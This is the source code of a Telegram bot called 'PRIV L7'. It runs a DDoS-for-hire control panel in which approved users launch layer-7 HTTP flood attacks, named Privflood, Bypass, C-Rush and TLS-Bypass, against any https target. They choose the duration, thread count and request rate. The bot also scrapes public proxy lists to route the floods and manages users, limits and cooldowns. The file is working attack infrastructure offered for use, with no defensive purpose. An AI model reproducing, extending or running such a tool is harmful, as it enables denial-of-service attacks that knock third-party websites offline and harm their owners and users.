/**
 * PRIV L7 — Full Telegram Bot Hub
 * No domain, no mini app. Everything through chat.
 * 
 * Install: npm install node-telegram-bot-api axios bcryptjs colors hpack node-bash-title
 * Run:     BOT_TOKEN=xxxxx ADMIN_ID=123456 node bot.js
 */

'use strict';

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { spawn } = require('child_process');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const bcrypt = require('bcryptjs');

/* ───────────────── CONFIG ───────────────── */

const CONFIG = {
  BOT_TOKEN: process.env.BOT_TOKEN || '',
  ADMIN_IDS: (process.env.ADMIN_ID || '').split(',').filter(Boolean).map(Number),
  SCRIPT_DIR: __dirname,
  DATA_DIR: path.join(__dirname, 'data'),
  DEFAULT_COOLDOWN: Number(process.env.COOLDOWN || 30),
  MAX_CONCURRENT: Number(process.env.MAX_CONCURRENT || 3),
  PROXY_FILE: 'proxy.txt',
  IRAN_FILE: 'iran.txt',
};

if (!CONFIG.BOT_TOKEN) {
  console.error('BOT_TOKEN env var required. Example: BOT_TOKEN=123:abc ADMIN_ID=987 node bot.js');
  process.exit(1);
}
if (CONFIG.ADMIN_IDS.length === 0) {
  console.error('ADMIN_ID env var required (numeric telegram user id).');
  process.exit(1);
}

fs.mkdirSync(CONFIG.DATA_DIR, { recursive: true });

const USERS_FILE = path.join(CONFIG.DATA_DIR, 'users.json');
const BLACKLIST_FILE = path.join(CONFIG.DATA_DIR, 'blacklist.json');
const AUDIT_FILE = path.join(CONFIG.DATA_DIR, 'audit.log');
const SESSIONS_FILE = path.join(CONFIG.DATA_DIR, 'sessions.json');

for (const f of [USERS_FILE, BLACKLIST_FILE, SESSIONS_FILE]) {
  if (!fs.existsSync(f)) fs.writeFileSync(f, f === BLACKLIST_FILE ? '[]\n' : '{}\n');
}

/* ───────────────── STATE ───────────────── */

const sessions = new Map();       // id -> { id, owner, method, target, duration, startedAt, child, status }
const cooldowns = new Map();      // telegramId -> { until }
const pendingInput = new Map();   // telegramId -> { action, data, expires }

/* ───────────────── STORAGE ───────────────── */

function readJSON(file, fallback = {}) {
  try { return JSON.parse(fs.readFileSync(file, 'utf8')); }
  catch { return fallback; }
}

function writeJSON(file, data) {
  const tmp = file + '.tmp';
  fs.writeFileSync(tmp, JSON.stringify(data, null, 2) + '\n', { mode: 0o600 });
  fs.renameSync(tmp, file);
}

function audit(event, actor, details = {}) {
  const line = JSON.stringify({
    at: new Date().toISOString(),
    event, actor, details,
  });
  try { fs.appendFileSync(AUDIT_FILE, line + '\n'); } catch {}
}

/* ───────────────── USERS ───────────────── */

function loadUsers() { return readJSON(USERS_FILE, {}); }
function saveUsers(u) { writeJSON(USERS_FILE, u); }

function getUser(telegramId) {
  const users = loadUsers();
  return users[String(telegramId)] || null;
}

function upsertUser(telegramId, patch) {
  const users = loadUsers();
  const id = String(telegramId);
  users[id] = { ...(users[id] || {}), ...patch, updatedAt: new Date().toISOString() };
  saveUsers(users);
  return users[id];
}

function deleteUser(telegramId) {
  const users = loadUsers();
  delete users[String(telegramId)];
  saveUsers(users);
}

function isAdmin(telegramId) {
  return CONFIG.ADMIN_IDS.includes(telegramId);
}

function ensureUserExists(msg) {
  const id = msg.from.id;
  const existing = getUser(id);
  if (existing) return existing;

  // First-run bootstrap for admins
  if (isAdmin(id)) {
    return upsertUser(id, {
      telegramId: id,
      username: msg.from.username || null,
      firstName: msg.from.first_name || null,
      role: 'admin',
      createdAt: new Date().toISOString(),
      limits: { maxDuration: 0, maxThreads: 0, maxRate: 0, maxConcurrent: 0, cooldown: 0 },
    });
  }

  // Regular users auto-register as pending
  return upsertUser(id, {
    telegramId: id,
    username: msg.from.username || null,
    firstName: msg.from.first_name || null,
    role: 'pending',
    createdAt: new Date().toISOString(),
    limits: { maxDuration: 300, maxThreads: 16, maxRate: 90, maxConcurrent: 1, cooldown: CONFIG.DEFAULT_COOLDOWN },
  });
}

/* ───────────────── BLACKLIST ───────────────── */

function loadBlacklist() { return readJSON(BLACKLIST_FILE, []); }
function saveBlacklist(l) { writeJSON(BLACKLIST_FILE, l); }

function normalizeHost(raw) {
  return String(raw || '').toLowerCase()
    .replace(/^[a-z]+:\/\//, '')
    .replace(/[/?#].*$/, '')
    .replace(/:\d+$/, '')
    .replace(/\.+$/, '');
}

function hostMatches(host, pattern) {
  host = normalizeHost(host);
  pattern = normalizeHost(pattern);
  if (!host || !pattern) return false;
  if (pattern.startsWith('*.')) {
    const base = pattern.slice(2);
    return host === base || host.endsWith('.' + base);
  }
  return host === pattern;
}

function isBlacklisted(host) {
  return loadBlacklist().some(p => hostMatches(host, p));
}

/* ───────────────── METHODS ───────────────── */

const METHODS = [
  {
    id: 'priv',
    name: 'Privflood',
    file: 'priv.js',
    example: 'priv <url> <duration> <threads> <rate> [cookies] [headers] [ddg]',
    parse: (args) => {
      const [target, duration, threads, rate, ...flags] = args;
      const build = [target, duration, CONFIG.PROXY_FILE, threads, rate];
      if (flags.includes('cookies')) build.push('-c');
      if (flags.includes('headers')) build.push('-h');
      if (flags.includes('ddg')) build.push('-ddg');
      return { target, duration, threads, rate, buildArgs: build };
    },
  },
  {
    id: 'bypass',
    name: 'Bypass',
    file: 'bypass.js',
    example: 'bypass <GET|POST> <url> <duration> <threads> <rate> [query=0|1|2|3] [limit] [delay=ms]',
    parse: (args) => {
      const [method, target, duration, threads, rate, ...opts] = args;
      const build = [method.toUpperCase(), target, duration, threads, rate, CONFIG.PROXY_FILE];
      opts.forEach(o => {
        if (o.startsWith('query=')) build.push('--query', o.split('=')[1]);
        else if (o === 'limit') build.push('--limit', 'true');
        else if (o.startsWith('delay=')) build.push('--delay', o.split('=')[1]);
        else if (o === 'ios') build.push('--ios');
        else if (o === 'debug') build.push('--debug');
      });
      return { target, duration, threads, rate, buildArgs: build };
    },
  },
  {
    id: 'crush',
    name: 'C-Rush',
    file: 'l.js',
    example: 'crush <url> <duration> <threads> <rate> [cookies] [headers] [cache]',
    parse: (args) => {
      const [target, duration, threads, rate, ...flags] = args;
      const build = [target, duration, CONFIG.PROXY_FILE, threads, rate];
      if (flags.includes('cookies')) build.push('-c');
      if (flags.includes('headers')) build.push('-h');
      if (flags.includes('cache')) build.push('-ch', 'true');
      return { target, duration, threads, rate, buildArgs: build };
    },
  },
  {
    id: 'tls',
    name: 'TLS-Bypass',
    file: 'tls.js',
    example: 'tls <url> <duration> <rate> <threads>',
    parse: (args) => {
      const [target, duration, rate, threads] = args;
      return { target, duration, threads, rate, buildArgs: [target, duration, rate, threads, CONFIG.PROXY_FILE] };
    },
  },
];

function getMethod(id) { return METHODS.find(m => m.id === id); }

function availableMethods() {
  return METHODS.filter(m => fs.existsSync(path.join(CONFIG.SCRIPT_DIR, m.file)));
}

/* ───────────────── VALIDATION ───────────────── */

function validateTarget(raw) {
  let url;
  try { url = new URL(raw); } catch { throw new Error('URL tidak valid. Contoh: https://target.com'); }
  if (url.protocol !== 'https:') throw new Error('Target harus https://');
  return { url: raw, host: normalizeHost(url.hostname) };
}

function checkLimits(user, duration, threads, rate) {
  const l = user.limits || {};
  if (l.maxDuration > 0 && Number(duration) > l.maxDuration) throw new Error(`Durasi max ${l.maxDuration}s`);
  if (l.maxThreads > 0 && Number(threads) > l.maxThreads) throw new Error(`Threads max ${l.maxThreads}`);
  if (l.maxRate > 0 && Number(rate) > l.maxRate) throw new Error(`Rate max ${l.maxRate}`);
}

function userActiveSessions(telegramId) {
  return [...sessions.values()].filter(s => s.owner === telegramId && s.status === 'running').length;
}

/* ───────────────── PROXY SCRAPE ───────────────── */

const PROXY_SOURCES = [
  'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
  'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
  'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt',
  'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt',
  'https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt',
  'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
  'https://raw.githubusercontent.com/yuceltoluyag/GoodProxy/main/raw.txt',
  'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
  'https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt',
  'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
];

async function scrapeProxies() {
  const seen = new Set();
  for (const src of PROXY_SOURCES) {
    try {
      const r = await axios.get(src, { timeout: 12000 });
      r.data.toString().split(/\r?\n/).forEach(l => {
        const t = l.trim();
        if (/^\d{1,3}(\.\d{1,3}){3}:\d{1,5}$/.test(t)) seen.add(t);
      });
    } catch {}
  }
  const list = [...seen];
  fs.writeFileSync(path.join(CONFIG.SCRIPT_DIR, CONFIG.PROXY_FILE), list.join('\n'));
  return list.length;
}

/* ───────────────── ATTACK ENGINE ───────────────── */

function generateSessionId() { return crypto.randomBytes(4).toString('hex'); }

function startAttack(user, method, parsed) {
  const id = generateSessionId();
  const methodPath = path.join(CONFIG.SCRIPT_DIR, method.file);

  if (!fs.existsSync(methodPath)) {
    throw new Error(`Method file tidak ditemukan: ${method.file}`);
  }

  const child = spawn(process.execPath, [methodPath, ...parsed.buildArgs], {
    cwd: CONFIG.SCRIPT_DIR,
    detached: true,
    stdio: ['ignore', 'pipe', 'pipe'],
    env: { PATH: process.env.PATH || '', NODE_ENV: 'production' },
  });

  const session = {
    id,
    owner: user.telegramId,
    method: method.id,
    methodName: method.name,
    target: parsed.target,
    duration: Number(parsed.duration),
    threads: Number(parsed.threads),
    rate: Number(parsed.rate),
    startedAt: Date.now(),
    status: 'running',
    logs: '',
    child,
  };

  child.stdout.on('data', chunk => {
    session.logs = (session.logs + chunk.toString()).slice(-5000);
  });
  child.stderr.on('data', chunk => {
    session.logs = (session.logs + chunk.toString()).slice(-5000);
  });

  child.on('exit', () => {
    session.status = 'done';
    setTimeout(() => sessions.delete(id), 30000);
  });

  // Auto-kill after duration
  session.timer = setTimeout(() => {
    stopSession(id, 'duration_expired');
  }, session.duration * 1000);
  session.timer.unref();

  sessions.set(id, session);

  if (user.limits && user.limits.cooldown > 0) {
    cooldowns.set(user.telegramId, { until: Date.now() + user.limits.cooldown * 1000 });
  }

  audit('attack_started', user.telegramId, {
    id, method: method.id, target: parsed.target,
    duration: parsed.duration, threads: parsed.threads, rate: parsed.rate,
  });

  return session;
}

function stopSession(id, reason = 'manual') {
  const s = sessions.get(id);
  if (!s || s.status !== 'running') return false;

  try {
    if (s.child.pid) {
      process.kill(-s.child.pid, 'SIGKILL');
    }
  } catch {
    try { s.child.kill('SIGKILL'); } catch {}
  }
  clearTimeout(s.timer);
  s.status = 'stopped';
  audit('attack_stopped', s.owner, { id, reason });
  return true;
}

/* ───────────────── BOT ───────────────── */

const bot = new TelegramBot(CONFIG.BOT_TOKEN, { polling: true });

function esc(s) {
  return String(s || '').replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
}

async function reply(msg, text, opts = {}) {
  try { return await bot.sendMessage(msg.chat.id, text, { parse_mode: 'Markdown', ...opts }); }
  catch (e) {
    try { return await bot.sendMessage(msg.chat.id, text); } catch {}
  }
}

function fmtDuration(ms) {
  const s = Math.floor(ms / 1000);
  if (s < 60) return `${s}s`;
  const m = Math.floor(s / 60);
  if (m < 60) return `${m}m ${s % 60}s`;
  return `${Math.floor(m / 60)}h ${m % 60}m`;
}

/* ───────────────── COMMANDS ───────────────── */

const COMMANDS = new Map();

function cmd(name, handler, opts = {}) {
  COMMANDS.set(name, { handler, ...opts });
}

/* /start */
cmd('start', async (msg) => {
  const user = ensureUserExists(msg);
  const lines = [
    `🔥 *PRIV L7 BOT* 🔥`,
    ``,
    `User: *${esc(msg.from.first_name || 'anon')}*`,
    `ID: \`${msg.from.id}\``,
    `Role: *${esc(user.role)}*`,
    ``,
    `*Commands:*`,
    `/help — show all commands`,
    `/me — your account & limits`,
    `/methods — list attack methods`,
    `/status — your active sessions`,
    `/stop <id> — stop a session`,
    `/scrape — scrape fresh proxies`,
  ];

  if (isAdmin(msg.from.id)) {
    lines.push('', '*Admin:*');
    lines.push('/users — list all users');
    lines.push('/approve <id> — approve pending user');
    lines.push('/ban <id> — ban user');
    lines.push('/setlimit <id> <field> <value> — set limit');
    lines.push('/blacklist — show blocklist');
    lines.push('/black <host> — add to blocklist');
    lines.push('/unblack <host> — remove from blocklist');
    lines.push('/adduser <id> — pre-register a user');
    lines.push('/stats — global stats');
  }

  await reply(msg, lines.join('\n'));
});

/* /help */
cmd('help', async (msg) => {
  const user = ensureUserExists(msg);
  const m = availableMethods().map(m => `• \`${m.id}\` — ${m.name}\n  \`${m.example}\``).join('\n');
  const txt = [
    '*Methods available:*',
    m || '_none_',
    '',
    '*Example launch:*',
    '`/attack priv https://target.com 60 16 90 cookies`',
    '',
    '*All commands:*',
    '/start /help /me /methods /status /stop /scrape',
  ];
  if (isAdmin(msg.from.id)) {
    txt.push('');
    txt.push('*Admin:* /users /approve /ban /setlimit /blacklist /black /unblack /stats');
  }
  await reply(msg, txt.join('\n'));
});

/* /me */
cmd('me', async (msg) => {
  const user = ensureUserExists(msg);
  const l = user.limits || {};
  const cd = cooldowns.get(msg.from.id);
  const cdLeft = cd && cd.until > Date.now() ? Math.ceil((cd.until - Date.now()) / 1000) : 0;

  await reply(msg, [
    `*Account Info*`,
    `ID: \`${user.telegramId}\``,
    `Role: *${user.role}*`,
    `Since: ${new Date(user.createdAt).toLocaleDateString()}`,
    ``,
    `*Limits:*`,
    `Duration: ${l.maxDuration || '∞'}`,
    `Threads: ${l.maxThreads || '∞'}`,
    `Rate: ${l.maxRate || '∞'}`,
    `Concurrent: ${l.maxConcurrent || '∞'}`,
    `Cooldown: ${l.cooldown || 0}s`,
    cdLeft > 0 ? `\n⏳ Cooldown: *${cdLeft}s* left` : '',
  ].join('\n'));
});

/* /methods */
cmd('methods', async (msg) => {
  const list = availableMethods();
  if (list.length === 0) {
    return reply(msg, '❌ No method files found. Make sure priv.js / bypass.js / l.js / tls.js are in the bot folder.');
  }
  const txt = ['*Available methods:*', ''];
  list.forEach(m => {
    txt.push(`*${m.name}* (\`${m.id}\`)`);
    txt.push(`\`${m.example}\``);
    txt.push('');
  });
  await reply(msg, txt.join('\n'));
});

/* /status */
cmd('status', async (msg) => {
  const user = ensureUserExists(msg);
  const mine = [...sessions.values()].filter(s => s.owner === msg.from.id && s.status === 'running');

  if (mine.length === 0) return reply(msg, '📭 No active sessions.');

  const txt = ['*Your active sessions:*', ''];
  mine.forEach(s => {
    const elapsed = Math.floor((Date.now() - s.startedAt) / 1000);
    txt.push(`\`${s.id}\` — *${s.methodName}*`);
    txt.push(`  ${esc(s.target)}`);
    txt.push(`  ${elapsed}s / ${s.duration}s · ${s.threads}T · ${s.rate}R/s`);
    txt.push('');
  });
  await reply(msg, txt.join('\n'));
});

/* /stop */
cmd('stop', async (msg, args) => {
  const user = ensureUserExists(msg);
  const id = args[0];
  if (!id) return reply(msg, 'Usage: `/stop <session_id>`');

  const s = sessions.get(id);
  if (!s) return reply(msg, '❌ Session not found.');
  if (s.owner !== msg.from.id && !isAdmin(msg.from.id)) {
    return reply(msg, '❌ Not your session.');
  }

  stopSession(id, 'manual');
  await reply(msg, `✅ Stopped session \`${id}\``);
});

/* /scrape */
cmd('scrape', async (msg) => {
  const user = ensureUserExists(msg);
  if (!isAdmin(msg.from.id) && user.role !== 'user') {
    return reply(msg, '❌ Permission denied.');
  }
  await reply(msg, '🔄 Scraping proxies...');
  try {
    const count = await scrapeProxies();
    await reply(msg, `✅ *${count}* proxies saved to \`${CONFIG.PROXY_FILE}\``);
  } catch (e) {
    await reply(msg, `❌ Scrape failed: ${e.message}`);
  }
});

/* /attack */
cmd('attack', async (msg, args) => {
  const user = ensureUserExists(msg);

  if (user.role === 'pending') {
    return reply(msg, '⏳ Your account is pending approval. Contact admin.');
  }
  if (user.role === 'banned') {
    return reply(msg, '🚫 You are banned.');
  }

  const methodId = args[0];
  if (!methodId) return reply(msg, 'Usage: `/attack <method> <args...>`\nSee /methods');

  const method = getMethod(methodId);
  if (!method) return reply(msg, `❌ Unknown method \`${methodId}\``);

  if (!fs.existsSync(path.join(CONFIG.SCRIPT_DIR, method.file))) {
    return reply(msg, `❌ Method file missing: ${method.file}`);
  }

  // cooldown
  const cd = cooldowns.get(msg.from.id);
  if (cd && cd.until > Date.now()) {
    const left = Math.ceil((cd.until - Date.now()) / 1000);
    return reply(msg, `⏳ Cooldown active — *${left}s* left.`);
  }

  // concurrent
  const limit = user.limits?.maxConcurrent || 0;
  if (limit > 0 && userActiveSessions(msg.from.id) >= limit) {
    return reply(msg, `❌ Max concurrent sessions reached (${limit}).`);
  }

  let parsed;
  try {
    parsed = method.parse(args.slice(1));
    if (!parsed.target || !parsed.duration || !parsed.threads || !parsed.rate) {
      return reply(msg, `❌ Missing args.\nUsage: \`${method.example}\``);
    }
    const t = validateTarget(parsed.target);
    if (isBlacklisted(t.host)) {
      return reply(msg, `🚫 Target \`${esc(t.host)}\` is blacklisted.`);
    }
    checkLimits(user, parsed.duration, parsed.threads, parsed.rate);
  } catch (e) {
    return reply(msg, `❌ ${e.message}`);
  }

  try {
    const session = startAttack(user, method, parsed);
    const txt = [
      `🚀 *Attack launched*`,
      ``,
      `ID: \`${session.id}\``,
      `Method: *${session.methodName}*`,
      `Target: \`${esc(session.target)}\``,
      `Duration: ${session.duration}s`,
      `Threads: ${session.threads}`,
      `Rate: ${session.rate}/s`,
      ``,
      `Stop: \`/stop ${session.id}\``,
    ].join('\n');
    await reply(msg, txt);
  } catch (e) {
    await reply(msg, `❌ Launch failed: ${e.message}`);
  }
});

/* ───────────────── ADMIN COMMANDS ───────────────── */

function adminOnly(msg) {
  if (!isAdmin(msg.from.id)) {
    reply(msg, '🚫 Admin only.');
    return false;
  }
  return true;
}

cmd('users', async (msg) => {
  if (!adminOnly(msg)) return;
  const users = loadUsers();
  const list = Object.values(users);
  if (list.length === 0) return reply(msg, '_No users yet._');

  const txt = [`*Users (${list.length}):*`, ''];
  list.forEach(u => {
    const l = u.limits || {};
    txt.push(`${u.role === 'admin' ? '👑' : u.role === 'user' ? '✅' : u.role === 'banned' ? '🚫' : '⏳'} \`${u.telegramId}\` ${esc(u.firstName || u.username || '')}`);
    txt.push(`  role=${u.role} dur=${l.maxDuration || '∞'} th=${l.maxThreads || '∞'} rate=${l.maxRate || '∞'} conc=${l.maxConcurrent || '∞'} cd=${l.cooldown || 0}s`);
  });
  await reply(msg, txt.join('\n'));
});

cmd('approve', async (msg, args) => {
  if (!adminOnly(msg)) return;
  const id = Number(args[0]);
  if (!id) return reply(msg, 'Usage: `/approve <telegram_id>`');
  const u = getUser(id);
  if (!u) return reply(msg, '❌ User not found.');
  upsertUser(id, { role: 'user' });
  audit('user_approved', msg.from.id, { target: id });
  await reply(msg, `✅ User \`${id}\` approved.`);
});

cmd('ban', async (msg, args) => {
  if (!adminOnly(msg)) return;
  const id = Number(args[0]);
  if (!id) return reply(msg, 'Usage: `/ban <telegram_id>`');
  const u = getUser(id);
  if (!u) return reply(msg, '❌ User not found.');
  if (isAdmin(id)) return reply(msg, '❌ Cannot ban an admin.');
  upsertUser(id, { role: 'banned' });
  audit('user_banned', msg.from.id, { target: id });
  await reply(msg, `🚫 User \`${id}\` banned.`);
});

cmd('adduser', async (msg, args) => {
  if (!adminOnly(msg)) return;
  const id = Number(args[0]);
  if (!id) return reply(msg, 'Usage: `/adduser <telegram_id>`');
  if (getUser(id)) return reply(msg, '⚠️ User already exists.');
  upsertUser(id, {
    telegramId: id, role: 'user',
    createdAt: new Date().toISOString(),
    limits: { maxDuration: 300, maxThreads: 16, maxRate: 90, maxConcurrent: 1, cooldown: CONFIG.DEFAULT_COOLDOWN },
  });
  audit('user_added', msg.from.id, { target: id });
  await reply(msg, `✅ User \`${id}\` created.`);
});

cmd('setlimit', async (msg, args) => {
  if (!adminOnly(msg)) return;
  const [idStr, field, valueStr] = args;
  const id = Number(idStr);
  const value = Number(valueStr);
  if (!id || !field || isNaN(value)) {
    return reply(msg, 'Usage: `/setlimit <id> <maxDuration|maxThreads|maxRate|maxConcurrent|cooldown> <value>`');
  }
  if (!['maxDuration', 'maxThreads', 'maxRate', 'maxConcurrent', 'cooldown'].includes(field)) {
    return reply(msg, '❌ Invalid field.');
  }
  const u = getUser(id);
  if (!u) return reply(msg, '❌ User not found.');

  const limits = { ...(u.limits || {}), [field]: value };
  upsertUser(id, { limits });
  audit('limit_set', msg.from.id, { target: id, field, value });
  await reply(msg, `✅ \`${id}\` ${field}=${value}`);
});

cmd('blacklist', async (msg) => {
  if (!adminOnly(msg)) return;
  const list = loadBlacklist();
  if (list.length === 0) return reply(msg, '_Blacklist empty._');
  await reply(msg, '*Blacklisted:*\n' + list.map(h => `• \`${esc(h)}\``).join('\n'));
});

cmd('black', async (msg, args) => {
  if (!adminOnly(msg)) return;
  const host = normalizeHost(args[0]);
  if (!host) return reply(msg, 'Usage: `/black <host>`');
  const list = loadBlacklist();
  if (list.includes(host)) return reply(msg, '⚠️ Already blacklisted.');
  list.push(host);
  saveBlacklist(list);
  audit('blacklist_add', msg.from.id, { host });
  await reply(msg, `✅ Blacklisted \`${esc(host)}\``);
});

cmd('unblack', async (msg, args) => {
  if (!adminOnly(msg)) return;
  const host = normalizeHost(args[0]);
  const list = loadBlacklist();
  const idx = list.indexOf(host);
  if (idx === -1) return reply(msg, '❌ Not in blacklist.');
  list.splice(idx, 1);
  saveBlacklist(list);
  audit('blacklist_remove', msg.from.id, { host });
  await reply(msg, `✅ Removed \`${esc(host)}\``);
});

cmd('stats', async (msg) => {
  if (!adminOnly(msg)) return;
  const users = loadUsers();
  const total = Object.keys(users).length;
  const admins = Object.values(users).filter(u => u.role === 'admin').length;
  const pending = Object.values(users).filter(u => u.role === 'pending').length;
  const active = [...sessions.values()].filter(s => s.status === 'running').length;

  const txt = [
    '*Global stats*',
    `Users total: *${total}*`,
    `Admins: ${admins}`,
    `Pending: ${pending}`,
    `Active sessions: *${active}*`,
    `Blacklist: ${loadBlacklist().length}`,
    `Proxy file: ${fs.existsSync(path.join(CONFIG.SCRIPT_DIR, CONFIG.PROXY_FILE)) ? '✅ present' : '❌ missing'}`,
  ];
  await reply(msg, txt.join('\n'));
});

/* ───────────────── MESSAGE ROUTER ───────────────── */

bot.on('message', async (msg) => {
  if (!msg.text) return;
  const text = msg.text.trim();
  if (!text.startsWith('/')) return;

  const parts = text.slice(1).split(/\s+/);
  const commandName = parts[0].split('@')[0].toLowerCase();
  const args = parts.slice(1);

  const c = COMMANDS.get(commandName);
  if (!c) return;

  try {
    await c.handler(msg, args);
  } catch (e) {
    console.error(`[cmd ${commandName}]`, e);
    try { await reply(msg, `❌ Error: ${e.message}`); } catch {}
  }
});

/* ───────────────── STARTUP ───────────────── */

(async () => {
  console.log('[bot] starting...');
  console.log('[bot] script dir:', CONFIG.SCRIPT_DIR);
  console.log('[bot] admins:', CONFIG.ADMIN_IDS);

  const methods = availableMethods();
  console.log('[bot] methods available:', methods.map(m => m.id).join(', ') || '(none)');

  // Register admin users
  for (const id of CONFIG.ADMIN_IDS) {
    if (!getUser(id)) {
      upsertUser(id, {
        telegramId: id, role: 'admin',
        createdAt: new Date().toISOString(),
        limits: { maxDuration: 0, maxThreads: 0, maxRate: 0, maxConcurrent: 0, cooldown: 0 },
      });
      console.log(`[bot] bootstrapped admin ${id}`);
    }
  }

  try {
    const me = await bot.getMe();
    console.log(`[bot] connected as @${me.username}`);
  } catch (e) {
    console.error('[bot] getMe failed:', e.message);
  }

  // Auto-scrape proxies on startup if missing
  if (!fs.existsSync(path.join(CONFIG.SCRIPT_DIR, CONFIG.PROXY_FILE))) {
    console.log('[bot] no proxy file, scraping...');
    try {
      const n = await scrapeProxies();
      console.log(`[bot] scraped ${n} proxies`);
    } catch (e) {
      console.error('[bot] scrape failed:', e.message);
    }
  }
})();

process.on('SIGINT', () => { console.log('\n[bot] shutting down'); process.exit(0); });
process.on('SIGTERM', () => { console.log('\n[bot] shutting down'); process.exit(0); });